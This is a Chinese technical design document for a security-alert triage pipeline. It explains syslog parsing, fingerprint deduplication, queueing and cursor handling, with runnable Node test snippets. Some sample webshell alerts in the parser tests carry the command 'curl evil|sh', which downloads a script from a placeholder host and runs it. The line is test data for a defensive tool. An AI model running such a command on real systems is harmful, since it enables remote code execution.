---
type: module
id: MOD-TRIAGE-PIPELINE
covers: [triage-monitor.js, syslog-input.js, syslog-case.js]
updated: 2026-11-20
depth: complete
---

# 研判流水线 · triage-pipeline

模块名 `triage-pipeline`。实现文件三个：`triage-monitor.js`、`syslog-input.js`、`syslog-case.js`。

这份文档回答一个问题：**一条牧云告警从进来，到变成一份可读的案件材料，中间发生了什么。**

行号基准是 P003-T033 重取时的工作树（2026-11-20，`triage-monitor.js` 1093 行 / `syslog-input.js` 123 行 / `syslog-case.js` 212 行）。本页锚点由 `evidence/test/P003-T033/anchor-audit.mjs` 按历史版本机械平移、再人工逐条复核：映射表在同目录 `anchor-map.json`，漂移清单与重取方式见 [coding-reports/P003-T033.md](../../coding-reports/P003-T033.md)。**行号会继续漂**——改这三份文件后跑一遍 `node evidence/test/P003-T033/anchor-audit.mjs`，对不上的它逐条点名（数量、文件名、行号、以及「目标行附近没有文档提到的符号」）。

**三条改动线仍值得知道**：P003-T036 改队列可靠性（§5.1 合并写、§5.5 退避重排 / 死信 / TTL 归档、§5.4 暂停缓冲回灌）、P003-T037 改取数（§4.2 结论复用、§5.2 增量轮询与退避）、P003-T040 改证据落盘（§7.4、§8 的 `evidence[]` 带条件性 `args`）。

读法：

- §3 到 §7 是五条关键路径，每条对应一个覆盖构件，按路径顺序读就是一条告警的旅程
- §8 是对外契约，§9 是字段的值语义，改代码前先看这两节
- §10 是行为承诺与不变量，测试方按 `R-TRIAGE-xx` 编号回指
- §11 到 §14 是失败面、资源边界、取舍与查不到的部分
- 全局结构（进程入口、分层、配置项）见 [架构篇](../architecture.md)，本篇不重复

页里每条事实都带 `文件:行号`；标 🟡 的是从代码结构推出来的、不是直接写死的；标 🔴 的是代码里看不出来、已记在 §14。

## 1 职责与边界

**做什么**：把一条告警变成一条排队中的常规研判任务，并把研判材料与结果落到案件目录。

具体三件事：接住并解析告警（`syslog-input.js`）、排队与游标推进（`triage-monitor.js`）、材料与结果落盘（`syslog-case.js`）。

**不做什么**（每条都有出处）：

| 不负责 | 依据 |
| --- | --- |
| 不出研判结论。结论由注入的 `investigator` 产出，本模块只负责调用与转交 | `triage-monitor.js:1038-1042` |
| 不做规则判定。`ruleEngine` 是外部注入的对象，本模块只把它的结论记进步骤、挂到结果上 | `triage-monitor.js:1015-1025`、`triage-monitor.js:1043` |
| 不存研判记录本体。记录由注入的 `history.save()` 落盘，落盘位置不在这三个文件里（`history` 的行为见 §14 第 3 条） | `triage-monitor.js:1053` |
| 不查牧云事件。事件详情与列表都由 `eventToolbox` 去取，本模块只发起调用并处理返回 | `triage-monitor.js:976-982`、`syslog-case.js:32`、`syslog-case.js:61` |
| 不管 HTTP 路由与鉴权。三个文件的 import 列表只含 node 内置模块与本模块内的文件 | `triage-monitor.js:1-5`、`syslog-input.js:1-2`、`syslog-case.js:1-4`；另用下表后那条搜索命令验无 HTTP、路由、鉴权代码 |

最后一条用可复跑命令验，不是靠 import 猜（在仓根跑，退出码 0）：

```bash
grep -niE 'http|router|auth|token' triage-monitor.js syslog-input.js syslog-case.js
```

```
triage-monitor.js:562:      // 绑定失败不能让队列静默收不到消息：记进 summary()，队列照常服务（HTTP 还要活）。
triage-monitor.js:914:      { test_tool_paths: [], authorized_operators: [], whitelist_commands: [], known_source_countries: ['CN'], asset: {} });
```

两处命中都不是路由或鉴权代码：562 是一句中文注释里的「HTTP」，914 是基线配置字段名里的 `auth`。

**谁触发它**：

- UDP 报文（`SyslogReceiver` 收到一行就调一次回调，`syslog-input.js:111`）
- 定时轮询（`TriageMonitor.start()` 起的退避链 `#schedule()`，`triage-monitor.js:317-325`、`triage-monitor.js:331-336`）
- 外部代码直接调用 `acceptSyslog()` / `enqueue()` / `setEnabled()`（`triage-monitor.js:254`、`triage-monitor.js:182`、`triage-monitor.js:165`）

## 2 覆盖构件与关键路径

清单里点名的五个构件，逐个对应到本模块的代码：

| 构件 | 落在哪 | 关键路径 | 入口 |
| --- | --- | --- | --- |
| **syslog 接收与解析** | `syslog-input.js` | §3 | `SyslogReceiver.start()`（`syslog-input.js:108`）、`parseSyslog()`（`syslog-input.js:42`） |
| **指纹去重** | `syslog-input.js` + `triage-monitor.js` | §4 | `fingerprint()`（`syslog-input.js:92`）、`TriageMonitor._acceptSyslog()`（`triage-monitor.js:260`） |
| **队列与游标** | `triage-monitor.js` | §5 | `poll()`（`triage-monitor.js:202`）、`drain()`（`triage-monitor.js:349`）、`persist()`（`triage-monitor.js:160`） |
| **案件目录** | `syslog-case.js` | §6 | `writeSyslogCase()`（`syslog-case.js:92`）、`matchSyslogEvent()`（`syslog-case.js:23`） |
| **结果写回** | `syslog-case.js` + `triage-monitor.js` | §7 | `writeSyslogResult()`（`syslog-case.js:117`）、`updateSyslogDeliveryCount()`（`syslog-case.js:149`） |

一条告警在这五个构件之间的流转：

```
UDP 报文 ──▶ 解析 ──▶ 指纹 ──▶ 队列/游标 ──▶ 案件目录 ──▶ 结果写回
            (syslog-   (syslog-   (triage-      (syslog-     (syslog-
             input.js)  input.js)  monitor.js)   case.js)     case.js)
                             │                                      │
                             └── 同秒重复 ──▶ 折叠到原记录 ──────────┘
                                                （改写 result.json 与
                                                  05-研判结果.md）
```

`syslog` 与 `poll` 是两种输入方式，本模块内部都汇到同一条队列（轮询入队 `triage-monitor.js:757`、syslog 收包入库 `triage-monitor.js:884`）。

## 3 关键路径一：syslog 接收与解析

### 3.1 接收

`SyslogReceiver` 是本模块唯一的 socket（`syslog-input.js:103-122`）：

| 行为 | 依据 |
| --- | --- |
| 默认监听 `127.0.0.1:15514`，构造参数可覆盖 | `syslog-input.js:104` |
| 收到报文按 utf8 解码后交给 `onLine` 回调 | `syslog-input.js:110` |
| 回调抛错只打日志（`syslog 处理失败：…`），socket 继续收下一条 | `syslog-input.js:110-111` |
| socket 级错误只打日志（`syslog 接收错误：…`） | `syslog-input.js:112` |
| `start()` 绑定失败时抛错（Promise reject），绑定成功返回 socket 地址 | `syslog-input.js:113-118` |
| 绑定失败由调用方 `TriageMonitor.attachSyslog()` 接住并记进 `summary().syslog`（`listening:false` + `error`），队列与 HTTP 继续服务 | `triage-monitor.js:556-567` |
| `stop()` 关闭 socket 并置空 | `syslog-input.js:121` |

它只负责「收字符串」，解析不在这里做——回调拿到的就是一行原始文本。

### 3.2 解析

`parseSyslog(line)`（`syslog-input.js:42-57`）把一行报文拆成四部分：

| 输出字段 | 来源 | 依据 |
| --- | --- | --- |
| `msgid` | RFC5424 头部第 7 段 | `syslog-input.js:56`（取值 `match[7]`）、`syslog-input.js:8` |
| `ts` | 头部第 3 段（时间戳） | `syslog-input.js:56`（取值 `match[3]`） |
| `payload_format` | 正文走了哪个分支 | `syslog-input.js:48-54` |
| `payload` | 正文解析出的键值 | 同上 |

正文有三种形态，代码按首字符分流：结构化数据（`[` 开头）、JSON（`{` 开头）、键值对（其余）（`syslog-input.js:48-54`）。JSON 分支会把嵌套一层的对象拍平进顶层（`syslog-input.js:52-53`）。

**实测**（命令与输出都在仓根跑，退出码 0）：

```bash
cat <<'EOF' | node --input-type=module
import { parseSyslog } from './syslog-input.js';
const SD = '<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell [cloudwalker event_id="7" host_ip="10.0.0.5" process_command_line="curl evil|sh"]';
const JS = '<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell {"event_id":7,"host_ip":"10.0.0.5"}';
const KV = '<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell event_id=7 host_ip=10.0.0.5';
for (const line of [SD, JS, KV]) {
  const p = parseSyslog(line);
  console.log(p.payload_format, '| msgid=' + p.msgid, '| payload=' + JSON.stringify(p.payload));
}
EOF
```

```
structured-data | msgid=cloudwalker-webshell | payload={"event_id":"7","host_ip":"10.0.0.5","process_command_line":"curl evil|sh"}
json | msgid=cloudwalker-webshell | payload={"event_id":7,"host_ip":"10.0.0.5"}
keyvalue | msgid=cloudwalker-webshell | payload={"event_id":"7","host_ip":"10.0.0.5"}
```

### 3.3 解析的边界（实测）

| 情形 | 表现 | 依据 |
| --- | --- | --- |
| 不是 RFC5424 行 | 抛「不是合法的 RFC5424 syslog 行」 | `syslog-input.js:44-45` |
| 正文解析后为空 | 抛「syslog 正文解析后为空」 | `syslog-input.js:55` |
| JSON 正文后面还跟自由文本 | `JSON.parse` 抛语法错 | `syslog-input.js:50` |
| 结构化数据后面跟自由文本 | 结构化数据里**最后一个带引号的字段被丢掉** | `syslog-input.js:5`（引号字段的正则要求后面是 `键=` 或行尾） |

最后一条值得单独说：结构化数据不是正文末尾时，末尾那个字段会静默消失。

```bash
cat <<'EOF' | node --input-type=module
import { parseSyslog } from './syslog-input.js';
const SD = '<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell [cloudwalker event_id="7" host_ip="10.0.0.5" process_command_line="curl evil|sh"]';
const JS = '<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell {"event_id":7,"host_ip":"10.0.0.5"}';
console.log('SD 结尾       ->', JSON.stringify(parseSyslog(SD).payload));
console.log('SD + 自由文本 ->', JSON.stringify(parseSyslog(SD + ' msg').payload));
console.log('JSON 结尾     ->', JSON.stringify(parseSyslog(JS).payload));
try { parseSyslog(JS + ' msg'); } catch (e) { console.log('JSON + 自由文本 -> 抛错:', e.message); }
try { parseSyslog('not a syslog line'); } catch (e) { console.log('非 RFC5424 行  -> 抛错:', e.message); }
EOF
```

```
SD 结尾       -> {"event_id":"7","host_ip":"10.0.0.5","process_command_line":"curl evil|sh"}
SD + 自由文本 -> {"event_id":"7","host_ip":"10.0.0.5"}
JSON 结尾     -> {"event_id":7,"host_ip":"10.0.0.5"}
JSON + 自由文本 -> 抛错: Unexpected non-whitespace character after JSON at position 36 (line 1 column 37)
非 RFC5424 行  -> 抛错: 不是合法的 RFC5424 syslog 行
```

解析失败不会中断接收：`_acceptSyslog` 捕获后记进 `lastError`，这一条丢弃（`triage-monitor.js:812-816`）。

### 3.4 事件类型映射

`eventTypeFor(msgid)`（`syslog-input.js:59`）查一张固定表（`syslog-input.js:9-16`），共 9 项：

| MsgId | 类型名 |
| --- | --- |
| `cloudwalker-webshell` | `webshell` |
| `cloudwalker-honeypot` | `honeypot` |
| `cloudwalker-suspicious-command` | `suspicious_operation` |
| `cloudwalker-abnormal-login` | `abnormal_login` |
| `cloudwalker-brute-force` | `brute_force` |
| `cloudwalker-revshell` | `revshell` |
| `cloudwalker-malware` | `malware` |
| `cloudwalker-elevation-process` | `elevation_process` |
| `cloudwalker-abnormal-network` | `network_audit` |

表里没有的 MsgId 返回 `null`（`syslog-input.js:59`），接收侧直接跳过这一条，返回 `{ skipped: 'no_agent_for_msgid', msgid }`（`triage-monitor.js:266-267`）。

类型名在本模块里还有两处用途：拼事件详情工具名 `get_<type>_event`（`syslog-case.js:32`）、作案件目录的第一段路径与中文标题（`syslog-case.js:97`、`syslog-case.js:86-90`）。

### 3.5 事件时间换算

`eventSeconds(parsed, timeOffsetMinutes)`（`syslog-input.js:61-72`）把告警时间统一成**秒级 Unix 时间**：

| 规则 | 依据 |
| --- | --- |
| 取值优先级 `event_create_time` → `event_start_time` → 消息头 `ts` | `syslog-input.js:62` |
| 数字大于 `1e12` 视为毫秒，除 1000 取整 | `syslog-input.js:63` |
| 10 到 13 位的纯数字串按同一阈值判断 | `syslog-input.js:65` |
| `YYYY-MM-DD HH:MM:SS`（无时区）按 UTC 解析再减去偏移分钟数 | `syslog-input.js:68-70` |
| 偏移绝对值超过 `14 * 60` 分钟时按 0 处理 | `syslog-input.js:69` |
| 解析不出来返回 `null` | `syslog-input.js:71` |

偏移分钟的默认值取自环境变量 `HIDS_SYSLOG_TIME_OFFSET_MINUTES`（`syslog-input.js:62`）。源码注释写明为什么要显式给偏移：牧云事件字段是无时区的本地时间，而 RFC5424 头部带 UTC，不显式指定就会受接收服务器本地时区影响（`syslog-input.js:67-68`）。

```bash
cat <<'EOF' | node --input-type=module
import { eventSeconds } from './syslog-input.js';
const p = { ts: '2026-11-17T10:00:00Z', payload: { event_create_time: '2026-11-17 18:00:00' } };
console.log('offset=0 ->', eventSeconds(p, 0), '| offset=480 ->', eventSeconds(p, 480), '| 越界 9999 ->', eventSeconds(p, 9999));
console.log('epoch 毫秒 ->', eventSeconds({ ts: 't', payload: { event_create_time: 1763392800000 } }, 0));
console.log('非法时间 ->', eventSeconds({ ts: 't', payload: { event_create_time: 'not-a-time' } }, 0));
EOF
```

```
offset=0 -> 1794938400 | offset=480 -> 1794909600 | 越界 9999 -> 1794938400
epoch 毫秒 -> 1763392800
非法时间 -> null
```

### 3.6 会话键

`sessionKey(parsed)`（`syslog-input.js:83-90`）算出这条告警属于哪个会话，三级优先：

| 级别 | 键的形状 | 依据 |
| --- | --- | --- |
| 1. `env.XDG_SESSION_ID` 存在 | `<host_ip>\|session:<XDG_SESSION_ID>` | `syslog-input.js:86` |
| 2. `payload.session_id` 存在 | `<host_ip>\|session:<session_id>` | `syslog-input.js:88` |
| 3. 都没有 | `<host_ip>\|<来源 IP 或 local>\|<用户名或空>` | `syslog-input.js:88-89` |

第 3 级的来源 IP 依次取 `source_ip`、`login_ip`、`env.SSH_CLIENT` / `env.SSH_CONNECTION` 的第一段（`syslog-input.js:88`）。`env` 字段本身可以是字符串、数组或对象，解析在 `envFields()`（`syslog-input.js:74-81`）。

会话键是本模块里「同会话时间窗」与「历史结论」的关联键（`triage-monitor.js:316-319`、`triage-monitor.js:323-328`）。

## 4 关键路径二：指纹去重

### 4.1 指纹怎么算

`fingerprint(parsed)`（`syslog-input.js:92-101`）算出这条告警的**去重身份**。参与计算的固定部分是主机 IP、MsgId、事件名（`syslog-input.js:99-100`）；剩下的字段按事件类型分三档（`syslog-input.js:95-98`）：

| 事件类型 | 参与计算的字段 |
| --- | --- |
| `suspicious_operation` | `process_command_line`、`file_path` |
| `honeypot` | `source_ip`、`target_ip`、`target_port` |
| 其余类型 | `process_command_line`、`file_path`、`source_ip`（缺则 `login_ip`）、`target_ip`、`target_port`、`file_md5` |

缺失的字段统一转成空字符串（`syslog-input.js:100`），结果取 sha256 十六进制的前 16 位（`syslog-input.js:99-100`），因此指纹恒为 16 个字符。

**指纹计算里不含事件时间**：参与计算的字段在 `syslog-input.js:95-100` 逐项可数，没有时间字段。所以同一条告警在不同秒到达时指纹相同。

```bash
cat <<'EOF' | node --input-type=module
import { fingerprint } from './syslog-input.js';
const mk = (payload) => ({ msgid: 'cloudwalker-suspicious-command', ts: '2026-11-17T10:00:00Z', payload });
const a = fingerprint(mk({ host_ip: '10.0.0.5', event_name: 'cmd', process_command_line: 'id', file_path: '/tmp/x' }));
const b = fingerprint(mk({ host_ip: '10.0.0.5', event_name: 'cmd', process_command_line: 'id', file_path: '/tmp/x', source_ip: '1.2.3.4' }));
console.log('suspicious_operation 改 source_ip 后指纹不变 ->', a === b, a);
const c = fingerprint({ msgid: 'cloudwalker-webshell', ts: 't', payload: { host_ip: '10.0.0.5', event_name: 'w', process_command_line: 'id', file_path: '/tmp/x', source_ip: '1.2.3.4' } });
const d = fingerprint({ msgid: 'cloudwalker-webshell', ts: 't', payload: { host_ip: '10.0.0.5', event_name: 'w', process_command_line: 'id', file_path: '/tmp/x', source_ip: '9.9.9.9' } });
console.log('webshell 改 source_ip 后指纹改变 ->', c !== d);
console.log('指纹长度 ->', c.length);
EOF
```

```
suspicious_operation 改 source_ip 后指纹不变 -> true 07f4c24e365523a9
webshell 改 source_ip 后指纹改变 -> true
指纹长度 -> 16
```

### 4.2 折叠规则

去重表是内存里的一个 `Map`，键是指纹（`triage-monitor.js:124`、`triage-monitor.js:192`），值记着上次出现的时间与对应的记录 ID（`triage-monitor.js:888-890`）。

| 情形 | 判定 | 处理 | 依据 |
| --- | --- | --- | --- |
| **同秒重复** | 上次的 `last_delivery_second` 等于本次事件秒数 | 折叠到原记录，重复次数 +1，不新建记录 | `triage-monitor.js:827-848` |
| **同指纹 + 上一条已完结** | 距上次 `last_seen` 超过 1 秒（不同秒），且去重表指向的记录 `status='done'` 且有结论 | **复用结论**：不新建记录、不再跑研判，只累加 `repeat_count`（并回写研判记录与案卷） | `triage-monitor.js:533-554` |
| **五分钟内再次到达** | 距上次 `last_seen` 不超过 300 秒，且上一条未完结（排队 / 在跑 / 失败） | 新建记录，`occurrence_count` +1 | `triage-monitor.js:850-863` |
| **超过五分钟** | 距上次 `last_seen` 超过 300 秒，且上一条未完结 | 新建记录，`occurrence_count` 归 1 | `triage-monitor.js:850-851` |

同秒折叠时做了四件事（`triage-monitor.js:273-286`）：

1. `delivery_count` 与 `event_delivery_count` 各加 1（`triage-monitor.js:829-830`）
2. 原记录的 `repeat_count` 更新为 `event_delivery_count`，`updated_at` 刷新（`triage-monitor.js:835-836`）
3. 原记录已完结且有结果时，把新的重复次数回写进研判记录（`triage-monitor.js:279-283`）
4. 原记录已完结时，回写案件目录里的 `result.json` 与 `05-研判结果.md`（`triage-monitor.js:871`，实现在 `syslog-case.js:149-167`）

返回给调用方的是 `{ collapsed: true, repeat_count, alert_id }`（`triage-monitor.js:287`）。

新建记录的 ID 形状是 `syslog:<类型>:<指纹>:<事件秒数或 unknown>:<uuid>`（`triage-monitor.js:293`）。指纹相同但 uuid 不同，所以同一指纹在不同秒到达的是**两条不同的记录**。

### 4.3 实测：三次投递

```bash
cat <<'EOF' | node --input-type=module
import { rm } from 'node:fs/promises';
import { TriageMonitor } from './triage-monitor.js';
await rm('/tmp/tp-demo', { recursive: true, force: true });
const history = { async save(r) { return { alert_id: 'saved-1', saved_at: new Date().toISOString(), verdict: r.verdict }; }, async latest() { return null; } };
const investigator = { async runUnmatchedSyslog() { return { verdict: { verdict: 'uncertain', verdict_label: '存疑', summary: 'u' }, validation: { ok: true } }; } };
const monitor = new TriageMonitor({ service: {}, investigator, history, file: '/tmp/tp-demo/state.json', inputMode: 'syslog', concurrency: 1, casesDirectory: '/tmp/tp-demo/cases' });
await monitor.start();
const mask = (id) => String(id).replace(/:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/, ':<uuid>');
const line = (sec) => `<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell event_id=7 host_ip=10.0.0.5 process_command_line="id" event_create_time="2026-11-17 ${sec}"`;
const a = await monitor.acceptSyslog(line('10:00:00'));
const b = await monitor.acceptSyslog(line('10:00:00'));
const c = await monitor.acceptSyslog(line('10:02:00'));
console.log('第 1 条     ->', JSON.stringify({ ...a, alert_id: mask(a.alert_id) }));
console.log('同秒第 2 条 ->', JSON.stringify({ ...b, alert_id: mask(b.alert_id) }));
console.log('120 秒后    ->', JSON.stringify({ ...c, alert_id: mask(c.alert_id) }));
await new Promise(r => setTimeout(r, 200));
console.log('记录 ->', JSON.stringify([...monitor.records.values()].map(r => ({ repeat: r.repeat_count, occurrence: r.occurrence_count, status: r.status }))));
EOF
```

```
第 1 条     -> {"alert_id":"syslog:webshell:1a6bcb1dceac0b7a:1794909600:<uuid>","status":"queued"}
同秒第 2 条 -> {"collapsed":true,"repeat_count":2,"alert_id":"syslog:webshell:1a6bcb1dceac0b7a:1794909600:<uuid>"}
120 秒后    -> {"alert_id":"syslog:webshell:1a6bcb1dceac0b7a:1794909720:<uuid>","status":"queued"}
记录 -> [{"repeat":2,"occurrence":1,"status":"done"},{"repeat":1,"occurrence":2,"status":"done"}]
```

三条读出来是三件事：

- 第 1、2 条是**同一条记录**（`alert_id` 相同），重复次数从 1 变 2
- 第 3 条是**新记录**（时间戳 1794909720 与 1794909600 差 120 秒），但它的「出现次数」是 2——因为落在上次出现后的 300 秒内
- 指纹相同的三条记录，指纹部分都是 `1a6bcb1dceac0b7a`

## 5 关键路径三：队列与游标

> 本节在 P003-T036 里改过：队列快照改成「标脏 + 合并写」，暂停不再丢报文、也不再动游标，失败记录自动退避重排，
> done 记录按 TTL 归档。旧的下标行号（`triage-monitor.js:94-105` 之类）已经不准了，**按函数名对齐**：下面几节直接用
> 当前实现的函数与行号（基准是本卡提交）。

### 5.1 状态与落盘

队列状态全在内存里（字段见 `triage-monitor.js:92-173` 的构造函数）：`dedupe`、`windows`、`acceptChain`、`records`、
`watermark`、`watermarkIds`、`initialized`、`enabled`、`lastPollAt`、`lastError`、`active`、`polling`、`pollEpoch`、`timer`、`syslog`
（`{listening, bind, error}`，绑定成败都记在这里，`summary()` 才看得出收不到消息），P003-T036 新增：
`retryTimers`、`pendingCounts`（重排定时器与攒着的重复投递计数）、`pausedBuffer` / `pausedReceived` / `pausedDropped` / `pausedReplayed` / `pausedSince`（暂停窗口）、
`syslogStats`（收包计数）、`archivedCount`、`dirtyGen` / `writtenGen` / `flushing` / `flushTimer`（合并写）；P003-T037 新增：
`concurrency`（规范化后的并发度）、`queueLimit` / `dropped`（队列上限与丢弃计数）、`backoffMs` / `emptyPolls` / `maxBackoffMs`（轮询退避）、
`timerActive`（退避链开关，取代 `timer` + `setInterval`）。字段整体在 `triage-monitor.js:92-170`。

**落盘是标脏 + 合并写（`markDirty()` `triage-monitor.js:231`、`flush()` `triage-monitor.js:259`）**：

| 调用 | 谁用 | 语义 |
| --- | --- | --- |
| `markDirty()` | 热路径：每条 syslog 报文、每个研判步骤、`run()` 收尾 | 标脏；写盘由一个合并写窗口决定，**峰值最多 1 次 / `persist_interval_ms`（缺省 1000ms）** |
| `persist()` | 管理面：`enqueue` / `poll` / `setEnabled` / `archiveDone` / `cancel` | 标脏并等到自己这一代真的落盘（单飞：已有一次写在飞就复用它） |
| `writeChain`（getter） | 测试与调用方当「等落盘」的同步点 | 等价于 `persist()`（`triage-monitor.js:246`） |
| `flush()` | 内部 / 收尾 | 没有新脏状态时不写空快照；一次写在飞时复用那一次；在飞期间标的脏由写完后的 `finally` 补排下一次合并写（不补排的话这份脏状态永远不落盘，`triage-monitor.js:259-274`） |

快照内容（`writeSnapshot()` `triage-monitor.js:280`）＝ `initialized`、`enabled`、`watermark`、`watermark_ids`、`last_received_at`、
`archived_count`、`paused{since,received,dropped,replayed,buffer}`、`records`、`dedupe`、`windows`。

| 落盘习惯 | 依据 |
| --- | --- |
| 写入单飞，不并发写同一个文件；前一次失败只记日志，不阻断下一次 | `triage-monitor.js:199-219` |
| 目录按 `0o700` 创建 | `triage-monitor.js:220-225` |
| 临时文件名带 uuid，不覆盖既有文件（`flag: 'wx'`） | `triage-monitor.js:226-228` |
| 文件权限 `0o600`，`rename` 原子替换 | `triage-monitor.js:288-290` |
| 研判收尾时若队列里没有排队中/等重试的记录，立刻落一次（不悬一次延迟写） | `triage-monitor.js:930-936` |

`load()`（`triage-monitor.js:115`）是它的逆操作：

- 文件不存在时忽略（`ENOENT`），其他错误向上抛
- 状态文件不是合法 JSON 时，`JSON.parse` 抛错，`start()` 会失败
- 上次进程中断时留在 `running` 的记录，改判为 `queued`、阶段写「等待重试」——**这是「研判中途状态只标脏、不逐次落盘」的兑付方式**：崩溃最多丢一个合并写窗口的进度，重启后照原任务重跑
- `attempts` 已到上限的失败记录直接标 `dead_letter`，其余失败记录留给 `start()` 的 `resumeRetries()` 重排（`triage-monitor.js:194-198`）
- 老记录缺 `verified_facts` / `evidence` 时从研判记录回填，**键口径见 §5.5**（`triage-monitor.js:201-208`）

### 5.2 轮询与游标

轮询只在 `poll` 模式下跑（`triage-monitor.js:708-708`），由 `start()` 起的退避链驱动，基准间隔 `intervalMs` 默认 30000 毫秒，定时器 `unref()`（不影响进程退出）（`triage-monitor.js:108`、`triage-monitor.js:331-336`）。

轮询是**增量取数**（P003-T037）：游标只由查询参数 `from` 决定，不再翻页找时间边界。

`poll()`（`triage-monitor.js:343-420`）一轮的规则：

| 规则 | 依据 |
| --- | --- |
| 同一时刻只跑一轮（`polling` 标志）；暂停时不跑 | `triage-monitor.js:709-710` |
| 查询固定带 `sort: 'time'`（排序键 `created_at desc, id asc`，见 `cloudwalker.js:41-43`） | `triage-monitor.js:353` |
| 已初始化时带 `from = watermark`（上一轮最大 `createdAt`，含端点）；冷启动不带 | `triage-monitor.js:715` |
| 每页 50 条，一轮最多 20 页；一页取满才继续翻页——翻页是为了取完本轮新增，不是找边界 | `triage-monitor.js:13-14`、`triage-monitor.js:377-380` |
| 牧云部分事件类型读取失败（`partial`）就中止，**游标不推进** | `triage-monitor.js:726` |
| 首次轮询只把游标钉在当前页最新时间，**不入队** | `triage-monitor.js:364-369` |
| 兜底：平台忽略 `from` 时，早于游标的行也跳过（不靠它找边界） | `triage-monitor.js:736` |
| 等于游标的行靠 `watermark_ids` 去重（`from` 含端点，同一秒会被再取一次） | `triage-monitor.js:737` |
| 遇到更新的时间就推进游标，并清空 `watermark_ids` | `triage-monitor.js:738-739` |
| 20 页取满仍没取完 → 报错「新增告警超过本轮扫描上限，请检查自动研判积压」 | `triage-monitor.js:381` |
| 暂停或 `pollEpoch` 变化 → 丢弃本轮结果 | `triage-monitor.js:747` |
| 出错只记 `lastError`，游标不动 | `triage-monitor.js:765-770` |

新告警入队时按 `found.reverse()` 的顺序写进 `records`（`triage-monitor.js:749-760`），即**倒序入队**；实际执行顺序由 §5.3 的优先级决定，不再等于插入序。

**退避**：`poll()` 返回 `{ found, empty, failed }`（`triage-monitor.js:773-773`）。空轮（含失败轮）把 `emptyPolls` 加一，下一轮延迟 `min(intervalMs × 2^emptyPolls, maxBackoffMs)`；见到新告警立刻回到 `intervalMs` 并清零（`triage-monitor.js:769-773`）。**冷启动那一轮也计入空轮**：这一轮只钉游标、不入队（`found.length === 0`，见上表「首次轮询」行），这就是 `emptyPolls = 1`，所以**进程重启后第一轮真实轮询的间隔是 `2 × intervalMs`**，不是 `intervalMs`；之后按空轮继续翻倍直到 `maxBackoffMs`。`maxBackoffMs` 缺省是 `intervalMs × 16`（`triage-monitor.js:112`）。定时器是 `setTimeout` 链而不是 `setInterval`：每轮跑完才排下一轮（`triage-monitor.js:331-336`）。

**实测**：

```bash
cat <<'EOF' | node --input-type=module
import { rm } from 'node:fs/promises';
import { TriageMonitor } from './triage-monitor.js';
await rm('/tmp/tp-poll', { recursive: true, force: true });
const pages = [];
let turn = 1;
const service = { async alerts({ offset }) {
  pages.push(offset);
  return turn === 1
    ? { alerts: [{ id: 'a1', createdAt: '2026-11-17T10:00:00Z' }, { id: 'a2', createdAt: '2026-11-17T10:00:00Z' }] }
    : { alerts: [{ id: 'b1', createdAt: '2026-11-17T11:00:00Z' }, { id: 'b2', createdAt: '2026-11-17T11:00:00Z' }] };
} };
const monitor = new TriageMonitor({ service, investigator: { async run() { return { verdict: {} }; } }, history: { async save(r) { return { alert_id: 'x', saved_at: '', verdict: r.verdict }; }, async latest() { return null; } }, file: '/tmp/tp-poll/state.json', inputMode: 'poll', concurrency: 1 });
await monitor.start();
console.log('首轮 poll -> watermark=' + monitor.watermark, '| watermark_ids=' + JSON.stringify([...monitor.watermarkIds]), '| 队列=' + JSON.stringify([...monitor.records.keys()]));
turn = 2;
await monitor.poll();
console.log('次轮 poll -> watermark=' + monitor.watermark, '| watermark_ids=' + JSON.stringify([...monitor.watermarkIds]));
console.log('入队顺序 ->', JSON.stringify([...monitor.records.keys()]));
console.log('请求的 offset 序列 ->', JSON.stringify(pages));

const fail = new TriageMonitor({ service: { async alerts() { return { partial: true, alerts: [] }; } }, investigator: {}, history: { async save() {}, async latest() {} }, file: '/tmp/tp-poll/fail.json', inputMode: 'poll' });
await fail.start();
console.log('部分读取失败 -> last_error=' + fail.lastError, '| watermark=' + fail.watermark);

const full = { async alerts({ offset }) { return { alerts: Array.from({ length: 50 }, (_, i) => ({ id: `x${offset + i}`, createdAt: '2026-11-17T10:00:00Z' })) }; } };
const cap = new TriageMonitor({ service: full, investigator: {}, history: { async save() {}, async latest() {} }, file: '/tmp/tp-poll/cap.json', inputMode: 'poll' });
await cap.load();
cap.initialized = true;
cap.watermark = '2026-11-17T09:00:00Z';
await cap.poll();
console.log('超过扫描上限 -> last_error=' + cap.lastError);
EOF
```

```
首轮 poll -> watermark=2026-11-17T10:00:00Z | watermark_ids=["a1","a2"] | 队列=[]
次轮 poll -> watermark=2026-11-17T11:00:00Z | watermark_ids=["b1","b2"]
入队顺序 -> ["b2","b1"]
请求的 offset 序列 -> [0,0]
部分读取失败 -> last_error=部分牧云事件类型读取失败，暂缓推进自动研判游标 | watermark=null
超过扫描上限 -> last_error=新增告警超过本轮扫描上限，请检查自动研判积压
```

### 5.3 队列执行

`drain()`（`triage-monitor.js:349-361`）是唯一的调度点：

| 规则 | 依据 |
| --- | --- |
| 并发上限 `concurrency`：构造参数缺省取 `HIDS_TRIAGE_CONCURRENCY`，再缺省 2；**env 与构造参数上的非法值（负数 / 小数 / 非数 / 空串 / 字符串 `'0'`）一律回落默认**，不会出现 `active < 非法值` 恒假把队列卡死。**显式数字 0 是合法值**：不起 worker、只排队（P003-T036 的测试与停机维护需要「入队但不跑」，两卡合并后的约定，见 §5.6 A5） | `triage-monitor.js:26-36`、`triage-monitor.js:108-109`、`triage-monitor.js:942-944` |
| 从 `status === 'queued'` 的记录里按**（类型风险 desc，occurrence_count desc，created_at asc）**取第一条 | `triage-monitor.js:619-622`、`triage-monitor.js:42-48` |
| 置为 `running`，阶段写「准备研判」，`attempts` 加 1 | `triage-monitor.js:950-953` |
| 一条跑完（无论成败）后 `active--` 再调 `drain()` | `triage-monitor.js:628-631` |

`run(record)`（`triage-monitor.js:363-432`）的阶段顺序：

| 顺序 | 做什么 | 依据 |
| --- | --- | --- |
| 1 | 先落一次盘 | `triage-monitor.js:365` |
| 2 | 算上下文（同会话时间窗、基线、情报、历史结论） | `triage-monitor.js:370-371`、`triage-monitor.js:313-332` |
| 3 | 关联牧云事件，阶段写「关联事件」 | `triage-monitor.js:372-374` |
